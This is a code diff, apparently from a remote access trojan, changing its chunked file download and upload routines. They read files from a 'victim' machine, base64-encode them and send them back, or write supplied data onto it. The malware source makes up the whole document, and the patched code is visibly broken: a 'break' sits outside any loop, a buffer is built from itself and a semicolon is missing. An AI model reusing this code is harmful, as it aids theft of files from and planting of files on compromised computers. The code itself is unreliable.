@@ -227,12 +227,14 @@ public:
         return { nCode, szMsg };
     }
 
-    void fnDownloadFile(std::shared_ptr<clsVictim> victim, const std::string& szFilePath, size_t nChunkSize)
+    void fnDownloadFile(std::shared_ptr<clsVictim> victim, const std::string& szFilePath, size_t nIdx, size_t nChunkSize)
     {
         std::ifstream file(szFilePath, std::ios::binary);
         if (!file)
         {
             STRLIST ls = {
+                "file",
+                "df",
                 "0",
                 szFilePath,
                 "Open file failed.",
@@ -243,37 +245,76 @@ public:
             return;
         }
 
+        int nOffset = nIdx * nChunkSize;
+        file.seekg(nOffset);
+
         std::vector<char> abBuffer(nChunkSize);
-        int nIdx = 0;
-        while (file)
-        {
-            file.read(abBuffer.data(), abBuffer.size());
-            std::streamsize nRead = file.gcount();
+        
+        file.read(abBuffer.data(), abBuffer.size());
+        std::streamsize nRead = file.gcount();
 
-            if (nRead <= 0)
-                break;
+        if (nRead <= 0)
+            break;
 
-            BUFFER abData(abData.begin(), abData.end());
+        BUFFER abData(abData.begin(), abData.end());
 
-            STRLIST ls = {
-                "1", //Code(OK)
-                szFilePath,
-                std::to_string(nIdx),
-                std::to_string(nChunkSize),
-                clsEZData::fnb64EncodeUtf8(abData),
-            };
+        STRLIST ls = {
+            "file",
+            "df",
+            "1", //Code(OK)
+            szFilePath,
+            std::to_string(nIdx),
+            std::to_string(nChunkSize),
+            clsEZData::fnb64EncodeUtf8(abData),
+        };
 
-            victim->fnSendCommand(ls);
-            
-            nIdx++;
-        }
+        victim->fnSendCommand(ls);
 
         file.close();
     }
 
-    void fnUploadFile(clsVictim& victim, const std::string& szFilePath, size_t nChunkSize)
+    void fnUploadFile(std::shared_ptr<clsVictim> victim, const std::string& szFilePath, const std::vector<char> abBuffer, size_t nIdx, size_t nChunkSize)
     {
+        std::ofstream file(szFilePath, std::ios::binary);
+        if (!file)
+        {
+            STRLIST ls = {
+                "file",
+                "uf",
+                "0",
+                szFilePath,
+                "Open file failed.",
+            };
 
+            victim->fnSendCommand(ls);
+
+            return;
+        }
+
+        int nOffset = nIdx * nChunkSize;
+        file.seekg(nOffset);
+
+        try
+        {
+            file.write(abBuffer.data(), static_cast<std::streamsize>(abBuffer.size()));
+
+            STRLIST ls = {
+                "file",
+                "uf",
+                "1",
+                szFilePath,
+                std::to_string(nIdx),
+                std::to_string(nChunkSize),
+            }
+
+            victim->fnSendCommand(ls);
+        }
+        catch (const std::exception &e)
+        {
+
+        }
+
+        file.close();
     }
 
     RETMSG fnMkdir(const std::string& szDirPath)
